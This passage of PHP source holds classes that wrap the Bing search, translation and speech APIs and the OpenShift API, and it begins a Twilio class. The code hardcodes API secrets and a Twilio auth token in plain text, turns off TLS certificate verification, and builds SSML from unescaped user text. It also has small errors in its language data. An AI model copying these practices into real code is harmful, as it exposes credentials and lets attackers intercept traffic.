	//return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,Querétaro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
}


function bingtranslateccode($text){
	
		      $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/Detect?Text='.encodeuri("'".$text."'");
          $postdata = '';
          $header[] = "Content-Type: text/xml; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = curl_exec($ch);
          //return $jsonarray; 
          curl_close($ch);
          
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($jsonarray);
                        $objList = $objXml->getElementsByTagName("entry");
                        $langstr='';
                        //print_r($objList->length);
                        for($j=0; $j < $objList->length;$j++){
                        	$objHdd = $objList->item($j);                        
                          $langstr = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue;
                          if(arrmember(split('[-]',$langstr),"0")!=''){
														$langstr=arrmember(split('[-]',$langstr),"0");
													}
                        }
                        return $langstr;
}

function bingsearch($Service,$query,$pagesize,$page,$market,$tolang=''){
			if($Service=='Web'){	
			    
			    //$runtime= new runtime;
					//$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['teststart'] = $runtime->get_microtime();

          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
					/*//curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
					curl_setopt($ch, CURLOPT_PROXY, "http://42.227.50.31:80"); //代理服务器地址
					//curl_setopt($ch, CURLOPT_PROXYPORT, 80); //代理服务器端口
					//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http代理认证帐号，username:password的格式
					curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
					*/
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray); 
          curl_close($ch);
          
          //$runtime= new runtime;
					//echo $runtime->get_microtime()-$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['teststart'];

					//$jsonstr = array();
					$jsonstr['totalitem'] = '1000';
					$jsonstr['pagesize'] = $pagesize;


        if ((count($jsonarray['d']['results']) == floor($pagesize-1)) || (count($jsonarray['d']['results']) > floor($pagesize-1))){
                $strpagesize = $pagesize; 
				}
        else{ 
                $strpagesize = count($jsonarray['d']['results']);

        }
        if (fmod($jsonstr['totalitem'], $pagesize) == 0){
                	$jsonstr['totalpage']=$jsonstr['totalitem']/$pagesize;
 				}       
   			else{
                	$jsonstr['totalpage']=ceil($jsonstr['totalitem']/$pagesize);
   			}
        $endid = $strpagesize-1;
				$jsonstr['endid'] = $endid;
				$jsonstr['page'] = $page;        
				for($i=0;$i<=$endid;$i++){
						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
						$jsonstr[$i]['nodedescript']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
						$jsonstr[$i]['nodeotitle']  = (($jsonarray['d']['results'][$i]['Title']));	
						$jsonstr[$i]['nodeodescript']  = (($jsonarray['d']['results'][$i]['Description']));	
						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['Url']);		
						$jsonstr[$i]['nodedisplaylink']  = ($jsonarray['d']['results'][$i]['DisplayUrl']);				
						$jsonstr[$i]['nodeid']  = ($jsonarray['d']['results'][$i]['ID']);		
				}

			}
			elseif($Service=='News'){	
          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&NewsSortBy='.encodeuri("'").'Date'.encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
          //echo $url;
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);              
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray);   
          //return $jsonstr;  
          curl_close($ch);
          
					$jsonstr = array();
					$jsonstr['totalitem'] = '1000';
					$jsonstr['pagesize'] = $pagesize;


        if ((count($jsonarray['d']['results']) == floor($pagesize-1)) || (count($jsonarray['d']['results']) > floor($pagesize-1))){
                $strpagesize = $pagesize; 
				}
        else{ 
                $strpagesize = count($jsonarray['d']['results']);

        }
        if (fmod($jsonstr['totalitem'], $pagesize) == 0){
                	$jsonstr['totalpage']=$jsonstr['totalitem']/$pagesize;
 				}       
   			else{
                	$jsonstr['totalpage']=ceil($jsonstr['totalitem']/$pagesize);
   			}
        $endid = $strpagesize-1;
				$jsonstr['endid'] = $endid;
				$jsonstr['page'] = $page;        
				for($i=0;$i<=$endid;$i++){	
						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));	
						$jsonstr[$i]['nodedescript']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Description'],ENT_COMPAT,"UTF-8"));	
						$jsonstr[$i]['nodeotitle']  = (($jsonarray['d']['results'][$i]['Title']));	
						$jsonstr[$i]['nodeodescript']  = (($jsonarray['d']['results'][$i]['Description']));	
						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['Url']);		
						$jsonstr[$i]['nodedisplaylink']  = ($jsonarray['d']['results'][$i]['DisplayUrl']);				
						$jsonstr[$i]['nodeid']  = ($jsonarray['d']['results'][$i]['ID']);						
						$jsonstr[$i]['nodedate']  = ($jsonarray['d']['results'][$i]['Date']);						
				}
				
			}
			elseif($Service=='Image'){	
          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON&Market='.encodeuri("'").$market.encodeuri("'");
          //echo $url;
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);      
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray);   
          //return $jsonstr;  
          curl_close($ch);
          
					$jsonstr = array();
					$jsonstr['totalitem'] = '1000';
					$jsonstr['pagesize'] = $pagesize;


        if ((count($jsonarray['d']['results']) == floor($pagesize-1)) || (count($jsonarray['d']['results']) > floor($pagesize-1))){
                $strpagesize = $pagesize; 
				}
        else{ 
                $strpagesize = count($jsonarray['d']['results']);

        }
        if (fmod($jsonstr['totalitem'], $pagesize) == 0){
                	$jsonstr['totalpage']=$jsonstr['totalitem']/$pagesize;
 				}       
   			else{
                	$jsonstr['totalpage']=ceil($jsonstr['totalitem']/$pagesize);
   			}
        $endid = $strpagesize-1;
				$jsonstr['endid'] = $endid;
				$jsonstr['page'] = $page;        
				for($i=0;$i<=$endid;$i++){
						$jsonstr[$i]['nodeurl']  = ($jsonarray['d']['results'][$i]['MediaUrl']);
						$jsonstr[$i]['nodetitle']  = GetGB2312String(htmlspecialchars($jsonarray['d']['results'][$i]['Title'],ENT_COMPAT,"UTF-8"));
						$jsonstr[$i]['nodelink']  = ($jsonarray['d']['results'][$i]['SourceUrl']);					
						$jsonstr[$i]['nodeid']  = ($jsonarray['d']['results'][$i]['ID']);						
						$jsonstr[$i]['nodewidth']  = ($jsonarray['d']['results'][$i]['Width']);	
						$jsonstr[$i]['nodeheight']  = ($jsonarray['d']['results'][$i]['Height']);						
						$jsonstr[$i]['nodefilesize']  = ($jsonarray['d']['results'][$i]['FileSize']);	
						$jsonstr[$i]['nodetype']  = ($jsonarray['d']['results'][$i]['ContentType']);	
						$jsonstr[$i]['nodethumburl']  = ($jsonarray['d']['results'][$i]['Thumbnail']['MediaUrl']);
					
				}
				
			}	
			elseif($Service=='Translate'){	
					$langs = $this->bingsearchcountrylang();	
					$langsto='';			
					if($tolang=='multi'){
						$langsto = split('[|]',$this->bingsearchcountrycode());
					}else{
						$langsto[0] = $tolang.','.preg_replace("/.*[\|]?".$tolang."[,]([^\||\,]+)[\|]?.*/", "$1", $langs);
					}
          //print_r($this->bingsearchcountrycode());   
          //exit;		
					$page=min(ceil(count($langsto)/$pagesize),$page);          
					for($i=(($tolang=='multi')?$pagesize*($page-1):0);$i<(($tolang=='multi')?min(count($langsto),$pagesize*($page)):count($langsto));$i++){
          $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/Translate?Text='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&To='.encodeuri("'".arrmember(split('[,]',$langsto[$i]),"0")."'");
          //echo $url;
          $postdata = '';
          $header[] = "Content-Type: text/xml; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);              
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = (curl_exec($ch));
          
          $objXml = new DOMDocument();  
					$objXml->preserveWhiteSpace = true;
          $objXml->async = false; 
          // 加Xml 文件    
          $objXml->loadXML($jsonarray);
          $objList = $objXml->getElementsByTagName("entry");
          for($j=0; $j < $objList->length;$j++){                        
          	$objHdd = $objList->item($j);

						$jsonstr[$i]['nodetext'] = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue?(GetGB2312String($objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue)):'';
						$jsonstr[$i]['nodeotext'] = $objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue?($objHdd->getElementsByTagName(arrmember(split("[:]","d:Text"),"1"))->item(0)->nodeValue):'';					
						$jsonstr[$i]['nodelang'] = arrmember(split('[,]',$langsto[$i]),"0");		
						$jsonstr[$i]['nodeclang'] = arrmember(split('[,]',$langsto[$i]),"1");		
					}
				}
				
			}			
	
      //print_r($jsonstr);                
      return $jsonstr;
}

function bingclientoauth(){
$AccessTokenUri = "https://oxford-speech.cloudapp.net:443/token/issueToken";
// Note: Sign up at http://www.projectoxford.ai to get a subscription key.  
// Search for Speech APIs from Azure Marketplace.  
// Use the subscription key as Client secret below.
$clientId = "4c2d1744-d684-4155-ad91-955fdba57259";
$clientSecret = "8b054b8b59c4485588683331233bb51f";
$ttsHost = "https://speech.platform.bing.com";	
          $data = array('client_secret' => $clientSecret,'client_id' => $clientId,'grant_type' => 'client_credentials', 'scope' => $ttsHost);
					$postdata = http_build_query($data);
					//echo $postdata;
          $header[] = "Content-type: application/x-www-form-urlencoded";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $AccessTokenUri);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          //curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = json_decode(curl_exec($ch), true);
          return $jsonarray['access_token']; 
          curl_close($ch);         
}
	
function bingttsvoice($lang='all'){
$langstr="ar-EG;Female;Microsoft Server Speech Text to Speech Voice (ar-EG, Hoda)|de-DE;Female;Microsoft Server Speech Text to Speech Voice (de-DE, Hedda)|de-DE;Male;Microsoft Server Speech Text to Speech Voice (de-DE, Stefan, Apollo)|en-AU;Female;Microsoft Server Speech Text to Speech Voice (en-AU, Catherine)|en-CA;Female;Microsoft Server Speech Text to Speech Voice (en-CA, Linda)|en-GB;Female;Microsoft Server Speech Text to Speech Voice (en-GB, Susan, Apollo)|en-GB;Male;Microsoft Server Speech Text to Speech Voice (en-GB, George, Apollo)|en-IN;Male;Microsoft Server Speech Text to Speech Voice (en-IN, Ravi, Apollo)|en-US;Female;Microsoft Server Speech Text to Speech Voice (en-US, ZiraRUS)|en-US;Male;Microsoft Server Speech Text to Speech Voice (en-US, BenjaminRUS)|es-ES;Female;Microsoft Server Speech Text to Speech Voice (es-ES, Laura, Apollo)|es-ES;Male;Microsoft Server Speech Text to Speech Voice (es-ES, Pablo, Apollo)|es-MX;Male;Microsoft Server Speech Text to Speech Voice (es-MX, Raul, Apollo)|fr-CA;Female;Microsoft Server Speech Text to Speech Voice (fr-CA, Caroline)|fr-FR;Female;Microsoft Server Speech Text to Speech Voice (fr-FR, Julie, Apollo)|fr-FR;Male;Microsoft Server Speech Text to Speech Voice (fr-FR, Paul, Apollo)|it-IT;Male;Microsoft Server Speech Text to Speech Voice (it-IT, Cosimo, Apollo)|ja-JP;Female;Microsoft Server Speech Text to Speech Voice (ja-JP, Ayumi, Apollo)|ja-JP;Male;Microsoft Server Speech Text to Speech Voice (ja-JP, Ichiro, Apollo)|pt-BR;Male;Microsoft Server Speech Text to Speech Voice (pt-BR, Daniel, Apollo)|ru-RU;Female;Microsoft Server Speech Text to Speech Voice (pt-BR, Daniel, Apollo)|ru-RU;Male;Microsoft Server Speech Text to Speech Voice (ru-RU, Pavel, Apollo)|zh-CN;Female;Microsoft Server Speech Text to Speech Voice (zh-CN, HuihuiRUS)|zh-CN;Female;Microsoft Server Speech Text to Speech Voice (zh-CN, Yaoyao, Apollo)|zh-CN;Male;Microsoft Server Speech Text to Speech Voice (zh-CN, Kangkang, Apollo)|zh-HK;Female;Microsoft Server Speech Text to Speech Voice (zh-HK, Tracy, Apollo)|zh-HK;Male;Microsoft Server Speech Text to Speech Voice (zh-HK, Danny, Apollo)|zh-TW;Female;Microsoft Server Speech Text to Speech Voice (zh-TW, Yating, Apollo)|zh-TW;Male;Microsoft Server Speech Text to Speech Voice (zh-TW, Zhiwei, Apollo)";
$str=split('[|]',$langstr);
$k=0;$langk=0;
for($i=0;$i<count($str);$i++){
	if($lang=='all'){
		$langi=arrmember(split("[;]",$str[$i]),"0");
		$langi=arrmember(split("[-]",$langi),"0");		
		$langk=(!count($langs[$langi])||count($langs[$langi])===0)?'1':(count($langs[$langi])+1);
		$langs[$langi][$langk]=split("[;]",$str[$i]);
		//print_r(split("[;]",$str[$i]));
	}	
	elseif(stripos(arrmember(split("[;]",$str[$i]),"0"),$lang)===0){
		$langs[$lang][$k]=split("[;]",$str[$i]);
		//print_r(split("[;]",$str[$i]));
		$k=$k+1;
	}
}
return($langs);
}

function bingtts($content,$lang){

//print_r($lang);
    $encode = mb_detect_encoding($content, array("ASCII","UTF-8","GB2312","GBK","BIG5"));
		if($encode != "UTF-8"){
  		$content = iconv($encode,"UTF-8",$content);
		}else{
  		$content = $content;
		}
if($lang==''){
	$lang=$this->bingtranslateccode($content);
}	
$langs=$this->bingttsvoice($lang);
$langi=$langs[$lang][rand(0,count($langs[$lang])-1)];
//print_r($langi);
$AccessTokenUri = "https://oxford-speech.cloudapp.net:443/token/issueToken";
// Note: Sign up at http://www.projectoxford.ai to get a subscription key.  
// Search for Speech APIs from Azure Marketplace.  
// Use the subscription key as Client secret below.

$clientId = "4c2d1744-d684-4155-ad91-955fdba57259";
$clientSecret = "8b054b8b59c4485588683331233bb51f";
$ttsHost = "https://speech.platform.bing.com";
          $data = array('client_secret' => $clientSecret,'client_id' => $clientId,'grant_type' => 'client_credentials', 'scope' => $ttsHost);
					$postdata = http_build_query($data);
					//echo $postdata;
          $header[] = "Content-type: application/x-www-form-urlencoded";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $AccessTokenUri);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          //curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $result = curl_exec($ch);
          //return $result; 
          curl_close($ch);  
if (!$result) {
    throw new Exception("Problem with $AccessTokenUri, $php_errormsg");
  }
else{
   //return "Oxford Access Token: ". $result. "\n";

   // decode the json to get the Oxford Access Token object.
   $OxfordAcessToken = json_decode($result);
   $access_token = $OxfordAcessToken->{'access_token'};
	 //return $OxfordAcessToken->{'access_token'};   
   $ttsServiceUri = "https://speech.platform.bing.com:443/synthesize";
   //$SsmlTemplate = "<speak version='1.0' xml:lang='en-us'><voice xml:lang='%s' xml:gender='%s' name='%s'>%s</voice></speak>";
   $data = "<speak version='1.0' xml:lang='".$langi[0]."'><voice xml:lang='".$langi[0]."' xml:gender='".$langi[1]."' name='".$langi[2]."'>".$content."</voice></speak>";
   //return "tts post data: ". $data . "\n";
   $header='';
   $header[] = "Content-type: application/ssml+xml";
	 $header[] = "X-Microsoft-OutputFormat: riff-16khz-16bit-mono-pcm";
	 $header[] = "Authorization: "."Bearer ".$access_token."";
	 $header[] = "X-Search-AppId: 07D3234E49CE426DAA29772419F436CA";
	 $header[] = "X-Search-ClientID: 1ECFAE91408841A480F00935DC390960";
	 $header[] = "User-Agent: TTSPHP";
	 $header[] = "content-length: ".strlen($data)."";
	 //return $header;

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $ttsServiceUri);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          //curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
          $result = curl_exec($ch);
					//return $result;          
          //return $jsonarray['access_token']; 
          curl_close($ch);
    if (!$result) {
        throw new Exception("Problem with $AccessTokenUri, $php_errormsg");
      }
    else{
        return $result; //$http_response_header;
    }
}

}	


function bingtts2($content,$lang){

//print_r($lang);
    $encode = mb_detect_encoding($content, array("ASCII","UTF-8","GB2312","GBK","BIG5"));
		if($encode != "UTF-8"){
  		$content = iconv($encode,"UTF-8",$content);
		}else{
  		$content = $content;
		}
if($lang==''){
	$lang=$this->bingtranslateccode($content);
}	
$langs=$this->bingttsvoice($lang);
$langi=$langs[$lang][rand(0,count($langs[$lang])-1)];
//print_r($langi);
$AccessTokenUri = "https://oxford-speech.cloudapp.net:443/token/issueToken";
// Note: Sign up at http://www.projectoxford.ai to get a subscription key.  
// Search for Speech APIs from Azure Marketplace.  
// Use the subscription key as Client secret below.

$clientId = "4c2d1744-d684-4155-ad91-955fdba57259";
$clientSecret = "8b054b8b59c4485588683331233bb51f";
$ttsHost = "https://speech.platform.bing.com";
$data = array('grant_type' => 'client_credentials', 'client_id' => $clientId,
'client_secret' => $clientSecret, 'scope' => $ttsHost);
$data = http_build_query($data);
//echo "post data: ". $data;
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
        						 "content-length: ".strlen($data)."\r\n",
        'method'  => 'POST',
        'content' => $data,
    ),
);
$context  = stream_context_create($options);
//get the Oxford Access Token in json
$result = file_get_contents($AccessTokenUri, false, $context);
if (!$result) {
    throw new Exception("Problem with $AccessTokenUri, $php_errormsg");
  }
else{
   //echo "Oxford Access Token: ". $result. "\n";
  
   // decode the json to get the Oxford Access Token object.
   $OxfordAcessToken = json_decode($result);
   $access_token = $OxfordAcessToken->{'access_token'};
   $ttsServiceUri = "https://speech.platform.bing.com:443/synthesize";
   //$SsmlTemplate = "<speak version='1.0' xml:lang='en-us'><voice xml:lang='%s' xml:gender='%s' name='%s'>%s</voice></speak>";
   $data = "<speak version='1.0' xml:lang='".$langi[0]."'><voice xml:lang='".$langi[0]."' xml:gender='".$langi[1]."' name='".$langi[2]."'>".$content."</voice></speak>";
   //echo "tts post data: ". $data . "\n";
   $options = array(
    'http' => array(
        'header'  => "Content-type: application/ssml+xml\r\n" .
                    "X-Microsoft-OutputFormat: riff-16khz-16bit-mono-pcm\r\n" .
                    "Authorization: "."Bearer ".$access_token."\r\n" .
                    "X-Search-AppId: 07D3234E49CE426DAA29772419F436CA\r\n" .
                    "X-Search-ClientID: 1ECFAE91408841A480F00935DC390960\r\n" .
                    "User-Agent: TTSPHP\r\n" .
                    "content-length: ".strlen($data)."\r\n",
        'method'  => 'POST',
        'content' => $data,
        ),
    );
    $context  = stream_context_create($options);
    // get the wave data
    $result = file_get_contents($ttsServiceUri, false, $context);
    if (!$result) {
        throw new Exception("Problem with $AccessTokenUri, $php_errormsg");
      }
    else{
        return $result; //$http_response_header;
    }
}

}	

}

class openshift_class{

function openshiftuserdomain($page,$pagesize,$uname,$pwd){

 								$url = "https://openshift.redhat.com/broker/rest/domains";
                $header[] = "Content-type:  application/json; version=1.0";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                //curl_setopt($ch, CURLOPT_POST, 1);
                //curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);                 
                curl_setopt($ch, CURLOPT_USERPWD, $uname.':'.$pwd);
		        		$list = curl_exec($ch);
                curl_close($ch);
                //print_r(json_decode($list,true));								

                
			
    	    	$domainlist = array();
    	    	$domainarray = array();
    	    	$domainarray = json_decode($list,true);
   	     		$domainlist['length'] = count($domainarray['data']);
      
    	    	if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $domainlist['length'];
   	     	$totalitem = $domainlist['length'];
   	     	if (fmod($totalitem, $pagesize) == 0){
   	             $totalpage=$totalitem/$pagesize;
     	   	}       
     	   	else{
     	           $totalpage=ceil($totalitem/$pagesize);
    	    	}       
  	      	if ($totalpage == $page)
  	              $endid = $totalitem-1;
  	      	elseif ($totalpage > $page)
	                $endid = floor($strpagesize*($page)-1);
 	       	elseif ($totalpage < $page){
 	               $endid = floor($strpagesize*($page-1)-1);
 	       	}                       
		
        	for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                       		$domainlist['data'][$i]['userid'] = $domainarray['data'][$i]['id'];                        
                       		$domainlist['data'][$i]['methodlinks'] = $domainarray['data'][$i]['links'];                        
                       		$domainlist['data'][$i]['maindomain'] = $domainarray['data'][$i]['suffix'];                        
        	}		
       	
		return $domainlist;
		//return $vdiskarray;	
                
}

}
?>

<?php 
class twilio_class{

var $AccountSid = 'AC5a64a713dc6ed405fceb383fa316d920';
var $twilionumber = '+19712647061';
var $AuthToken = 'd6a4702860709aa568cd631acbb36f8a';

function transfercall($type='json',$clientdialnumber,$timestamp,$usercallid){
               	$url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type."?PageSize=5&From=".$clientdialnumber."&To=".$this->twilionumber;
               	$ch = curl_init();
               	curl_setopt($ch, CURLOPT_URL, $url);
               	curl_setopt($ch, CURLOPT_HEADER, 0);
               	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
               	//curl_setopt($ch, CURLOPT_POST, 1);
               	curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
               	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
               	//curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
               	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
               	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
               	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
               	$jsonstr = json_decode(curl_exec($ch),true);
